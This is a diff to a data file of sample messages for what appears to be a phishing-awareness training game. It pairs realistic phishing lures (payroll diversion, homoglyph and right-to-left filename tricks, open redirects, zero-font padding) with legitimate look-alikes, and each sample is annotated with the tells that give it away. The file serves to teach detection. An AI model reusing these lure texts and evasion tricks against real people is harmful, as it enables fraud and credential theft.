+    rarity: "legendary",
+    channel: "Email",
+    technique: "Payroll diversion",
+    lever: "Trust",
+    from: "chris.ortega@yourcompany.com",
+    subject: "Direct deposit change for next pay period",
+    body: "Hi, I switched banks last week and need my direct deposit updated before the next pay run. Can you tell me what you need from me? I'm on the road today so email is best.",
+    paragraphs: [
+      "Hi,",
+      "I switched banks last week and need my direct deposit updated before the next pay run. Can you tell me what you need from me? I'm on the road today so email is best.",
+      "Thanks so much, Chris",
+    ],
+    headers: mail({ age: "1998", returnPath: "chris.ortega@yourcompany.com", replyTo: "chris.ortega.work@protonmail.com", spf: "pass (yourcompany.com)", dkim: "pass (yourcompany.com)", dmarc: "pass", received: "mail.yourcompany.com, new sign-in from abroad", bad: ["Reply-To", "Received from"], good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "A coworker's real mailbox was taken over, so authentication passes",
+      "No links or attachments: it just starts a friendly conversation",
+      "'Email is best' avoids the phone call that would expose it",
+    ],
+  },
+  {
+    id: 407,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Notification system abuse",
+    lever: "Fear",
+    from: "notifications@github.com",
+    subject: "[security-advisories] Critical issue found in your repository",
+    body: "You were mentioned in an issue: \"Security alert: unauthorized access to your repository was detected. Authorize the GitHub Scanner app to review it.\"",
+    paragraphs: [
+      "@you was mentioned in this issue.",
+      "Security alert: unauthorized access to your repository was detected from a new location. Authorize the GitHub Scanner app to review and remove the access.",
+      "Reply to this email directly or view it on GitHub. You are receiving this because you were mentioned.",
+    ],
+    links: [{ text: "Authorize GitHub Scanner", href: "https://github-scanner.example/authorize" }],
+    headers: mail({ age: "2007", returnPath: "noreply@github.com", spf: "pass (github.com)", dkim: "pass (github.com)", dmarc: "pass", received: "out.github.com", good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "Anyone can @mention you in a throwaway repo, and GitHub really sends the mail",
+      "The sender is real, but the words and link came from the attacker",
+      "GitHub doesn't send security alerts through issue mentions",
+    ],
+  },
+  {
+    id: 408,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Real invoice abuse",
+    lever: "Fear",
+    from: "service@paypal.com",
+    subject: "Invoice from Billing Department (#00481): $599.00",
+    body: "You've received an invoice for $599.00. Seller note: Your account was charged for a crypto purchase. If this wasn't you, call support at (555) 011-2848 right away.",
+    paragraphs: [
+      "You've received an invoice.",
+      "Amount due: $599.00, from Billing Department.",
+      "Seller note: Your account was charged for a crypto purchase. If this wasn't you, call support at (555) 011-2848 right away.",
+    ],
+    links: [{ text: "View and pay invoice", href: "https://www.paypal.com/invoice/p/#INV2-4K8R" }],
+    headers: mail({ age: "1999", returnPath: "service@paypal.com", spf: "pass (paypal.com)", dkim: "pass (paypal.com)", dmarc: "pass", received: "mx.paypal.com", good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "Attackers send real PayPal invoices, so it passes every check",
+      "An invoice is a request, not a charge: nothing has been paid",
+      "The seller note is attacker-written, and the phone number is theirs",
+    ],
+  },
+  {
+    id: 409,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Calendar invite injection",
+    lever: "Curiosity",
+    from: "calendar-notification@google.com",
+    subject: "Invitation: Benefits enrollment review, Thu 2pm",
+    body: "You have been invited to Benefits enrollment review, Thursday 2:00 PM. Your calendar has already added it. Notes: complete your pre-read before attending.",
+    paragraphs: [
+      "You have been invited to the following event.",
+      "Benefits enrollment review, Thursday 2:00 PM to 2:30 PM.",
+      "Notes: Open enrollment closes Friday. Complete your pre-read and sign in to confirm your plan before attending.",
+      "Going? Yes / No / Maybe",
+    ],
+    links: [{ text: "Pre-read and sign-in", href: "https://benefits-enroll-portal.example/sso" }],
+    headers: mail({ age: "1997", returnPath: "calendar-server@google.com", spf: "pass (google.com)", dkim: "pass (google.com)", dmarc: "pass", received: "mail-sor.google.com", good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "Google really sent it: anyone can invite you, and it lands on your calendar",
+      "The organizer isn't anyone from your company",
+      "The sign-in link in the notes is the attack",
+    ],
+  },
+  {
+    id: 410,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Compromised colleague",
+    lever: "Trust",
+    from: "priya.nair@yourcompany.com",
+    subject: "Can you look at this before the 3pm?",
+    body: "Hey, can you look over the attached before the 3pm? Mostly the second page. I'm in back to back meetings but I'll check for comments. Thanks!!",
+    paragraphs: [
+      "Hey, can you look over the attached before the 3pm? Mostly the second page. I'm in back to back meetings but I'll check for comments.",
+      "Thanks!!",
+      "Priya",
+    ],
+    attachments: ["Q4_review_notes.html"],
+    headers: mail({ age: "1998", returnPath: "priya.nair@yourcompany.com", spf: "pass (yourcompany.com)", dkim: "pass (yourcompany.com)", dmarc: "pass", received: "mail.yourcompany.com, new sign-in from abroad", bad: ["Received from"], good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "Her real account, her real tone, and a meeting you may really have",
+      "A document in .html form is a fake login page, not review notes",
+      "When in doubt, message her on another channel first",
+    ],
+  },
 
   // ---------------------------------------------------------------- MYTHIC
-  // Real-looking sender. Often the headers are the only evidence left.
+  // Real-looking sender. Often the details are the only evidence left.
   {
     id: 501,
     rarity: "mythic",
@@ -438,16 +829,18 @@ export const MESSAGES: Message[] = [
     lever: "Fear",
     from: "no-reply@accounts.google.com",
     subject: "Security alert: a subpoena was issued for your account",
-    body: "Google received a legal request to produce your account content. You can view the case materials or submit a protest in the support portal. Sign in to review the case. The Google Accounts team",
-    isPhish: true,
-    headers: [
-      { label: "DKIM", value: "pass (accounts.google.com)", tone: "good" },
-      { label: "Signed-to", value: "me@mail-relay7.example", tone: "bad" },
-      { label: "Link host", value: "sites.google.com/view/case-review", tone: "bad" },
+    body: "Google received a legal request to produce your account content. You can view the case materials or submit a protest in the support portal.",
+    paragraphs: [
+      "Google received a legal request to produce your account content.",
+      "You can view the case materials or submit a protest in the support portal. Sign in to review the case.",
+      "The Google Accounts team",
     ],
+    links: [{ text: "Review the case", href: "https://sites.google.com/view/case-review-7714" }],
+    headers: mail({ age: "1997", returnPath: "fwd-7714@mail-relay7.example", replyTo: "same as sender", spf: "pass (mail-relay7.example)", dkim: "pass (accounts.google.com), signed for me@mail-relay7.example", dmarc: "pass", received: "mail-relay7.example", bad: ["Return-Path", "DKIM", "Received from"] }),
+    isPhish: true,
     flags: [
       "A genuine Google-signed mail was re-sent as is, so the signature verifies",
-      "The 'to' it was signed for isn't you",
+      "It was signed for a different address, not yours",
       "The portal is on sites.google.com, which anyone can publish to",
       "Modeled on a real 2025 campaign. Passing DKIM doesn't prove it's for you",
     ],
@@ -460,12 +853,16 @@ export const MESSAGES: Message[] = [
     lever: "Fear",
     from: "no-reply@аpple.com",
     subject: "Your Apple ID was used to sign in on a new device",
-    body: "Your Apple ID was used to sign in to iCloud via a web browser. Date and time: today, 2:14 AM. If this was not you, secure your account now. Apple Support",
-    isPhish: true,
-    headers: [
-      { label: "From (raw)", value: "no-reply@xn--pple-43d.com", tone: "bad" },
-      { label: "Encoding", value: "IDN (internationalized domain name)", tone: "bad" },
+    body: "Your Apple ID was used to sign in to iCloud via a web browser. Date and time: today, 2:14 AM. If this was not you, secure your account now.",
+    paragraphs: [
+      "Dear customer,",
+      "Your Apple ID was used to sign in to iCloud via a web browser. Date and time: today, 2:14 AM.",
+      "If this was not you, secure your account now.",
+      "Apple Support",
     ],
+    links: [{ text: "Secure my account", href: "https://id.аpple.com/account" }],
+    headers: mail({ age: "5 weeks ago", returnPath: "no-reply@xn--pple-43d.com", spf: "pass (xn--pple-43d.com)", dkim: "pass (xn--pple-43d.com)", dmarc: "pass", received: "mail.xn--pple-43d.com", bad: ["Return-Path", "SPF", "DKIM", "Domain registered"] }),
+    isPhish: true,
     flags: [
       "That first 'a' is a Cyrillic letter that renders identically",
       "Only the raw punycode form, xn--pple-43d, gives it away",
@@ -480,17 +877,19 @@ export const MESSAGES: Message[] = [
     lever: "Trust",
     from: "receipts@squareup.com",
     subject: "Your receipt from Glades Coffee: $6.75",
-    body: "Thanks for stopping by! 1 x Cold Brew, $4.75. 1 x Tip, $2.00. Total $6.75. Paid with Visa. No action needed. Rate your experience in the app.",
-    fold: "Your account has been flagged by our fraud team. To prevent suspension, verify your payment information within 24 hours using the secure form: square-receipt-verify.example",
-    headers: [
-      { label: "SPF", value: "softfail (sending IP not listed)", tone: "bad" },
-      { label: "Body size", value: "3,812 blank lines between text blocks", tone: "bad" },
+    body: "Thanks for stopping by! 1 x Cold Brew, $4.75. 1 x Tip, $2.00. Total $6.75. Paid with Visa. No action needed.",
+    paragraphs: [
+      "Thanks for stopping by!",
+      "1 x Cold Brew, $4.75. 1 x Tip, $2.00. Total $6.75. Paid with Visa.",
+      "No action needed. Rate your experience in the app.",
     ],
+    fold: "Your account has been flagged by our fraud team. To prevent suspension, verify your payment information within 24 hours using the secure form: square-receipt-verify.example",
+    headers: mail({ age: "2009", returnPath: "bounces@sq-mailer.example", spf: "softfail (sending IP not listed)", dkim: "none", dmarc: "fail", received: "sq-mailer.example", bad: ["Return-Path", "SPF", "DKIM", "DMARC", "Received from"] }),
     isPhish: true,
     flags: [
-      "Scroll down: blank padding pushes the real payload out of view",
+      "Scroll down the full email: blank padding pushes the real payload out of view",
       "The preview, and many filters, only ever see the harmless receipt",
-      "The spoofed sender only shows up as an SPF softfail in the headers",
+      "The sender is spoofed, which only shows up in the SPF and DMARC lines",
     ],
   },
   {
@@ -501,17 +900,111 @@ export const MESSAGES: Message[] = [
     lever: "Authority",
     from: "it-helpdesk@yourcompany.com",
     subject: "Voicemail from extension 2214 (0:42)",
-    body: "You have a new voicemail. Duration: 42 seconds. From: Internal 2214. Attached: VM_2214.html. This message was generated automatically by your company's phone system.",
-    headers: [
-      { label: "Route", value: "smart host, unauthenticated Direct Send", tone: "bad" },
-      { label: "SPF", value: "softfail, originating IP is external", tone: "bad" },
-      { label: "Attachment", value: "VM_2214.html", tone: "bad" },
+    body: "You have a new voicemail. Duration: 42 seconds. From: Internal 2214. This message was generated automatically by your company's phone system.",
+    paragraphs: [
+      "You have a new voicemail.",
+      "Duration: 42 seconds. From: Internal 2214.",
+      "This message was generated automatically by your company's phone system. Please do not reply.",
     ],
+    attachments: ["VM_2214.html"],
+    headers: mail({ age: "1998", returnPath: "it-helpdesk@yourcompany.com", spf: "softfail (originating IP is external)", dkim: "none", dmarc: "fail", received: "smart host, unauthenticated Direct Send", bad: ["SPF", "DMARC", "Received from"] }),
     isPhish: true,
     flags: [
       "Shown as internal because a tenant feature accepted unauthenticated mail",
       "No outside-sender banner, and the address is really your company's",
       "A voicemail is audio: an .html attachment is a login page in disguise",
+    ],
+  },
+  {
+    id: 505,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Right-to-left filename trick",
+    lever: "Trust",
+    from: "accounts@brightwater-marine.com",
+    subject: "Statement for October",
+    body: "Hi, your October statement is attached. Let me know if anything looks off and I'll get it corrected before month end.",
+    paragraphs: [
+      "Hi,",
+      "Your October statement is attached. Let me know if anything looks off and I'll get it corrected before month end.",
+      "Best, Accounts, Brightwater Marine",
+    ],
+    attachments: ["Statement_Oct_‮fdp.exe"],
+    headers: mail({ age: "2014", returnPath: "accounts@brightwater-marine.com", spf: "pass (brightwater-marine.com)", dkim: "pass (brightwater-marine.com)", dmarc: "pass", received: "mail.brightwater-marine.com, new sign-in from abroad", bad: ["Received from"], good: ["SPF", "DKIM"] }),
+    isPhish: true,
+    flags: [
+      "A hidden right-to-left character flips the end of the filename",
+      "It displays as Statement_Oct_exe.pdf, but the real file ends in .exe",
+      "Look at the full filename and type in your file manager before opening",
+    ],
+  },
+  {
+    id: 506,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Subdomain takeover",
+    lever: "Trust",
+    from: "alerts@offers.cypressbank.com",
+    subject: "Update your paperless preferences",
+    body: "We're updating our paperless statement options. Please sign in and confirm your preferences by the end of the month. No changes are made until you confirm.",
+    paragraphs: [
+      "Dear customer,",
+      "We're updating our paperless statement options. Please sign in and confirm your preferences by the end of the month. No changes are made until you confirm.",
+      "Thank you for banking with Cypress Bank.",
+    ],
+    links: [{ text: "Sign in and confirm", href: "https://offers.cypressbank.com/preferences" }],
+    headers: mail({ age: "2001", returnPath: "bounces@offers.cypressbank.com", spf: "pass (offers.cypressbank.com)", dkim: "pass (offers.cypressbank.com)", dmarc: "pass", received: "unclaimed-app-81.cloudhost.example", bad: ["Received from"], good: ["SPF", "DKIM", "DMARC"] }),
+    isPhish: true,
+    flags: [
+      "A forgotten marketing subdomain still pointed at a cloud host the bank gave up",
+      "Whoever claimed that host now sends real, passing mail from the bank's name",
+      "Your bank's login lives at its main site. Type it in rather than clicking",
+    ],
+  },
+  {
+    id: 507,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Open redirect link",
+    lever: "Trust",
+    from: "no-reply@linkedin.com",
+    subject: "You appeared in 9 searches this week",
+    body: "You appeared in 9 searches this week. See who's looking at your profile and what they searched for to find you.",
+    paragraphs: [
+      "You appeared in 9 searches this week.",
+      "See who's looking at your profile and what they searched for to find you.",
+      "You are receiving LinkedIn notification emails.",
+    ],
+    links: [{ text: "See all searches", href: "https://www.linkedin.com/slink?url=https%3A%2F%2Flnkd-signin.example%2Flogin" }],
+    headers: mail({ age: "2002", returnPath: "bounces@e.lnkd-mailer.example", spf: "softfail", dkim: "none", dmarc: "fail", received: "e.lnkd-mailer.example", bad: ["Return-Path", "SPF", "DMARC", "Received from"] }),
+    isPhish: true,
+    flags: [
+      "The link really starts with linkedin.com, so a quick hover looks safe",
+      "That real page just forwards you on to the attacker's url= value",
+      "Read the whole link, not only the start, and check the auth results",
+    ],
+  },
+  {
+    id: 508,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Zero-font hidden text",
+    lever: "Authority",
+    from: "benefits@yourcompany.com",
+    subject: "Open enrollment reminder",
+    body: "Open enrollment closes Friday. Please review your elections for next year in the benefits portal. No action means your current plan continues.",
+    paragraphs: [
+      "Hello,",
+      "Open enrollment closes Friday. Please review your elections for next year in the benefits portal. No action means your current plan continues.",
+      "Thank you, the Benefits Team",
+    ],
+    links: [{ text: "Go to the benefits portal", href: "https://benefits-yourcompany.example/login" }],
+    headers: mail({ age: "1998", returnPath: "benefits@mx-outreach.example", spf: "softfail", dkim: "none", dmarc: "fail", received: "mx-outreach.example; body has 1,240 characters at font-size 0", bad: ["Return-Path", "SPF", "DMARC", "Received from"] }),
+    isPhish: true,
+    flags: [
+      "Invisible zero-size text padded the message with harmless words to fool filters",
+      "You see a normal reminder, but the scanner read something else",
+      "The portal link isn't your company's domain, and DMARC fails",
     ],
   },
 
@@ -526,10 +1019,18 @@ export const MESSAGES: Message[] = [
     from: "no-reply@github.com",
     subject: "A new sign-in to your account",
     body: "A new sign-in to your account was detected from Chrome on Windows. If this was you, no action is needed.",
+    paragraphs: [
+      "Hey there,",
+      "A new sign-in to your account was detected from Chrome on Windows. If this was you, no action is needed.",
+      "If it wasn't, change your password from your account settings.",
+      "Thanks, The GitHub Team",
+    ],
+    links: [{ text: "Review your security log", href: "https://github.com/settings/security-log" }],
+    headers: clean("github.com", "2007", "out.github.com", "noreply@github.com"),
     isPhish: false,
     flags: [
       "Real sender domain",
-      "No link demanding action or credentials",
+      "The link goes to github.com itself, and nothing is demanded of you",
       "Tells you no action is needed if it was you",
     ],
   },
@@ -542,6 +1043,13 @@ export const MESSAGES: Message[] = [
     from: "billing@stripe.com",
     subject: "Your invoice #4821 is ready",
     body: "Your invoice #4821 is ready. View it anytime in your Stripe dashboard (log in directly at dashboard.stripe.com).",
+    paragraphs: [
+      "Hi,",
+      "Your invoice #4821 is ready. View it anytime in your Stripe dashboard (log in directly at dashboard.stripe.com).",
+      "Thanks for using Stripe.",
+    ],
+    attachments: ["Invoice_4821.pdf"],
+    headers: clean("stripe.com", "1995", "mail.stripe.com"),
     isPhish: false,
     flags: [
       "Real sender domain",
@@ -557,6 +1065,7 @@ export const MESSAGES: Message[] = [
     lever: "None",
     from: "72975",
     body: "Your dentist appt is Tue 3:30 PM with Dr. Lin. Reply C to confirm or call the office to reschedule.",
+    headers: text("72975", "registered short code", "12 earlier messages from this sender", { good: ["Sender type", "Carrier note"] }),
     isPhish: false,
     flags: [
       "Expected, from a short code your office uses",
@@ -572,6 +1081,12 @@ export const MESSAGES: Message[] = [
     from: "rick@rickscustomreels.com",
     subject: "yr reel is done",
     body: "hey sorry for the late reply been out on the water. your reel is fixed, new drag washers, no charge since it was under warranty. come get it whenever we close at 5",
+    paragraphs: [
+      "hey sorry for the late reply been out on the water.",
+      "your reel is fixed, new drag washers, no charge since it was under warranty. come get it whenever we close at 5",
+      "rick",
+    ],
+    headers: clean("rickscustomreels.com", "2012", "mail.rickscustomreels.com"),
     isPhish: false,
     flags: [
       "Sloppy writing alone doesn't make it a phish: small businesses write like this",
@@ -585,8 +1100,9 @@ export const MESSAGES: Message[] = [
     channel: "SMS",
     technique: "Legitimate",
     lever: "None",
-    from: "32665 (your bank's short code)",
+    from: "32665",
     body: "Cypress Bank Fraud Alert: Did you try to spend $212.40 at SHELL OIL? Reply YES or NO. We will never ask for your PIN or password by text.",
+    headers: text("32665", "registered short code", "41 earlier messages from this sender", { good: ["Sender type", "Carrier note"] }),
     isPhish: false,
     flags: [
       "Scary subject, but no link and no ask for credentials",
@@ -602,16 +1118,19 @@ export const MESSAGES: Message[] = [
     lever: "None",
     from: "it-announce@yourcompany.com",
     subject: "Scheduled maintenance: password change required by Friday",
-    body: "As announced in Monday's all-hands, passwords must be rotated this week. Please change yours through the employee portal you normally use. We are not including a link in this message, on purpose.",
-    headers: [
-      { label: "SPF / DKIM / DMARC", value: "pass (yourcompany.com)", tone: "good" },
-      { label: "Route", value: "internal, authenticated", tone: "good" },
+    body: "As announced in Monday's all-hands, passwords must be rotated this week. Please change yours through the employee portal you normally use.",
+    paragraphs: [
+      "Hello all,",
+      "As announced in Monday's all-hands, passwords must be rotated this week. Please change yours through the employee portal you normally use.",
+      "We are not including a link in this message, on purpose.",
+      "IT Operations",
     ],
+    headers: clean("yourcompany.com", "1998", "mail.yourcompany.com (internal, authenticated)"),
     isPhish: false,
     flags: [
       "Matches something announced through another channel",
       "Sends you to a portal you already know, with no link at all",
-      "Headers all pass, and it took an authenticated internal route",
+      "Every check passes, and it took an authenticated internal route",
     ],
   },
   {
@@ -623,15 +1142,19 @@ export const MESSAGES: Message[] = [
     from: "dse@docusign.net",
     subject: "Complete with DocuSign: Lease_Renewal_2027.pdf",
     body: "Palmetto Property Management sent you a document to review and sign. This is the renewal we discussed on the phone Tuesday.",
-    headers: [
-      { label: "SPF / DKIM", value: "pass (docusign.net)", tone: "good" },
-      { label: "Sender account", value: "leasing@palmettoproperty.example", tone: "good" },
+    paragraphs: [
+      "Palmetto Property Management sent you a document to review and sign.",
+      "This is the renewal we discussed on the phone Tuesday.",
+      "Sent by: leasing@palmettoproperty.example",
+      "Do not share this email. This link contains a secure access code.",
     ],
+    links: [{ text: "REVIEW DOCUMENT", href: "https://na3.docusign.net/Signing/?ti=2a90..." }],
+    headers: clean("docusign.net", "2003", "mail.docusign.net"),
     isPhish: false,
     flags: [
       "Same service as the classic abuse, but the sender account is your landlord",
       "It references a real conversation you can confirm",
-      "You were expecting this exact document",
+      "You were expecting this exact document, and it asks only for a signature",
     ],
   },
   {
@@ -643,16 +1166,244 @@ export const MESSAGES: Message[] = [
     from: "no-reply@accounts.google.com",
     subject: "Security alert: new sign-in on Pixel 9",
     body: "We noticed a new sign-in to your Google Account on a Pixel 9. If this was you, you don't need to do anything. If not, we'll help you secure your account.",
-    headers: [
-      { label: "DKIM", value: "pass (accounts.google.com)", tone: "good" },
-      { label: "Signed-to", value: "your own address", tone: "good" },
-      { label: "Link host", value: "accounts.google.com", tone: "good" },
+    paragraphs: [
+      "We noticed a new sign-in to your Google Account on a Pixel 9.",
+      "If this was you, you don't need to do anything. If not, we'll help you secure your account.",
+      "You can also see security activity at myaccount.google.com/notifications.",
     ],
+    links: [{ text: "Check activity", href: "https://accounts.google.com/AccountChooser?continue=activity" }],
+    headers: clean("accounts.google.com", "1997", "mail-sor.google.com", "bounces@accounts.google.com"),
     isPhish: false,
     flags: [
       "DKIM passes, and it was signed for your own address",
       "Links go to accounts.google.com itself",
       "You just signed in on your new phone: it matches",
+    ],
+  },
+  {
+    id: 13,
+    rarity: "common",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "notices@glades-county-library.org",
+    subject: "2 items due this Friday",
+    body: "Two items on your card are due Friday. You can renew them at the front desk or through your library account.",
+    paragraphs: [
+      "Hello,",
+      "Two items on your card are due Friday: \"A Field Guide to Florida Fishes\" and \"The Everglades: River of Grass\".",
+      "You can renew them at the front desk or through your library account.",
+      "Glades County Library",
+    ],
+    links: [{ text: "Renew online", href: "https://catalog.glades-county-library.org/account" }],
+    headers: clean("glades-county-library.org", "2006", "mail.glades-county-library.org"),
+    isPhish: false,
+    flags: [
+      "A library you actually use, listing books you actually borrowed",
+      "The link stays on the library's own domain, with no payment and no threat attached",
+    ],
+  },
+  {
+    id: 14,
+    rarity: "common",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "no-reply@spotify.com",
+    subject: "Your receipt from Spotify",
+    body: "Thanks for your payment of $11.99 for Spotify Premium. Your next bill is on the 14th. You can manage your plan in your account page.",
+    paragraphs: [
+      "Thanks for your payment.",
+      "$11.99 for Spotify Premium, charged to your Visa. Your next bill is on the 14th.",
+      "You can manage your plan in your account page.",
+    ],
+    links: [{ text: "Manage your plan", href: "https://www.spotify.com/account/subscription" }],
+    attachments: ["Receipt_Nov.pdf"],
+    headers: clean("spotify.com", "2006", "mail.spotify.com"),
+    isPhish: false,
+    flags: [
+      "The amount and date match a subscription you already have",
+      "It asks you to do nothing",
+      "The real domain, with every check passing",
+    ],
+  },
+  {
+    id: 15,
+    rarity: "rare",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "registrar@stateu.edu",
+    subject: "FINAL NOTICE: registration closes at 5 PM today",
+    body: "This is your final notice that spring registration closes at 5 PM today. You have a hold-free account but aren't registered yet. Sign in to the student portal to pick your classes.",
+    paragraphs: [
+      "Dear student,",
+      "This is your final notice that spring registration closes at 5 PM today. You have a hold-free account but aren't registered yet.",
+      "Sign in to the student portal to pick your classes. We don't link to it from email: use the portal bookmark or go through the university home page.",
+      "Office of the Registrar",
+    ],
+    headers: clean("stateu.edu", "1989", "mail.stateu.edu (internal, authenticated)"),
+    isPhish: false,
+    flags: [
+      "'FINAL NOTICE' sounds like a scam, but real deadlines exist",
+      "It's from the university's real domain and matches the academic calendar",
+      "It tells you not to rely on a link, and sends you to the portal you know",
+    ],
+  },
+  {
+    id: 16,
+    rarity: "rare",
+    channel: "SMS",
+    technique: "Legitimate",
+    lever: "None",
+    from: "28777",
+    body: "USPS: Your item was delivered in or at the mailbox at 1:42 pm. Reply STOP to cancel updates for this package.",
+    headers: text("28777", "registered short code", "you texted this number to track a package", { good: ["Sender type", "Carrier note"] }),
+    isPhish: false,
+    flags: [
+      "You signed up for these updates for this exact package",
+      "A real short code, with no link and nothing to pay",
+      "Compare with the parcel scams: those always want a click",
+    ],
+  },
+  {
+    id: 17,
+    rarity: "epic",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "no-reply@signin.aws",
+    subject: "AWS Account: root user sign-in detected",
+    body: "A sign-in to your AWS account with root credentials was detected. If this was you, no action is needed. If not, change your password and review your account's activity.",
+    paragraphs: [
+      "Hello,",
+      "A sign-in to your AWS account with root credentials was detected from Chrome on Windows. If this was you, no action is needed.",
+      "If not, change your password and review your account's activity from the AWS console.",
+      "Amazon Web Services",
+    ],
+    links: [{ text: "Review account activity", href: "https://console.aws.amazon.com/cloudtrail" }],
+    headers: clean("signin.aws", "2021", "amazonses.com"),
+    isPhish: false,
+    flags: [
+      "signin.aws looks odd, but it's a domain AWS really uses, and every check passes",
+      "The link goes to the real AWS console, and it asks for nothing",
+      "You logged in as root a minute ago: it matches",
+    ],
+  },
+  {
+    id: 18,
+    rarity: "epic",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "servicedesk@yourcompany.com",
+    subject: "[INC0048213] Your new Duo token enrollment",
+    body: "Following your request yesterday for a replacement phone, here's your Duo re-enrollment. This expires in 24 hours. Call the service desk if you didn't ask for this.",
+    paragraphs: [
+      "Hi,",
+      "Following your request yesterday for a replacement phone (ticket INC0048213), here's your Duo re-enrollment. This expires in 24 hours.",
+      "Call the service desk on the number on your badge if you didn't ask for this.",
+      "IT Service Desk",
+    ],
+    links: [{ text: "Start enrollment", href: "https://yourcompany.duosecurity.com/portal" }],
+    headers: clean("yourcompany.com", "1998", "mail.yourcompany.com (internal, authenticated)"),
+    isPhish: false,
+    flags: [
+      "You opened this ticket yourself, and the number matches",
+      "The link goes to your company's real Duo tenant",
+      "It offers a way to check by phone, using a number you already have",
+    ],
+  },
+  {
+    id: 19,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "closing@sunshinetitle.example",
+    subject: "Wire instructions for Friday's closing",
+    body: "Per our call this morning, your wire instructions are in our secure portal. Please confirm them by calling our office at the number on your contract before you send any funds.",
+    paragraphs: [
+      "Hi,",
+      "Per our call this morning, your wire instructions are in our secure portal. Please confirm them by calling our office at the number on your contract before you send any funds.",
+      "Wire fraud is common in real estate. We will never change these instructions by email.",
+      "Dana, Closing Officer, Sunshine Title",
+    ],
+    headers: clean("sunshinetitle.example", "2008", "mail.sunshinetitle.example"),
+    isPhish: false,
+    flags: [
+      "A wire request, but one you expected, following a real call",
+      "It tells you to verify by phone with a number you already have",
+      "It warns against changes by email: scammers do the opposite",
+    ],
+  },
+  {
+    id: 20,
+    rarity: "legendary",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "support@npmjs.com",
+    subject: "Your npm account: a new granular access token was created",
+    body: "A new granular access token was created on your account. If you created it, there's nothing to do. If not, go to npmjs.com yourself and revoke it.",
+    paragraphs: [
+      "Hi,",
+      "A new granular access token named \"ci-deploy\" was created on your account a few minutes ago.",
+      "If you created it, there's nothing to do. If not, go to npmjs.com yourself and revoke it from your access tokens page.",
+      "The npm team",
+    ],
+    headers: clean("npmjs.com", "2010", "mail.npmjs.com"),
+    isPhish: false,
+    flags: [
+      "The real npmjs.com, compare it to the .help lure",
+      "It has no link and no deadline",
+      "It names the token you just made for your deploy",
+    ],
+  },
+  {
+    id: 21,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "no-reply@apple.com",
+    subject: "Your Apple ID was used to sign in on a new device",
+    body: "Your Apple ID was used to sign in to iCloud on an iPhone 16. Date and time: today, 9:02 AM. If this was you, you can ignore this email.",
+    paragraphs: [
+      "Dear customer,",
+      "Your Apple ID was used to sign in to iCloud on an iPhone 16. Date and time: today, 9:02 AM.",
+      "If this was you, you can ignore this email. If not, go to appleid.apple.com to change your password.",
+      "Apple Support",
+    ],
+    headers: clean("apple.com", "1987", "mail.apple.com", "bounces@apple.com"),
+    isPhish: false,
+    flags: [
+      "Near identical to the homoglyph lure, but the raw domain really is apple.com",
+      "No punycode anywhere in the headers",
+      "It points you to type appleid.apple.com yourself, and you did just set up that phone",
+    ],
+  },
+  {
+    id: 22,
+    rarity: "mythic",
+    channel: "Email",
+    technique: "Legitimate",
+    lever: "None",
+    from: "receipts@squareup.com",
+    subject: "Your receipt from Everglades Outfitters: $48.20",
+    body: "Thanks for stopping by! 1 x Topwater Lure, $14.20. 2 x Leader Line, $34.00. Total $48.20. Paid with Visa. No action needed.",
+    paragraphs: [
+      "Thanks for stopping by!",
+      "1 x Topwater Lure, $14.20. 2 x Leader Line, $34.00. Total $48.20. Paid with Visa.",
+      "No action needed. Rate your experience in the app.",
+    ],
+    links: [{ text: "Rate your experience", href: "https://squareup.com/receipts/feedback" }],
+    headers: clean("squareup.com", "2009", "mail.squareup.com"),
+    isPhish: false,
+    flags: [
+      "A receipt for something you really bought this morning",
+      "Nothing is hiding further down, and every check passes",
+      "Same template as the push-down lure, which is why you open the full email",
     ],
   },
 ];
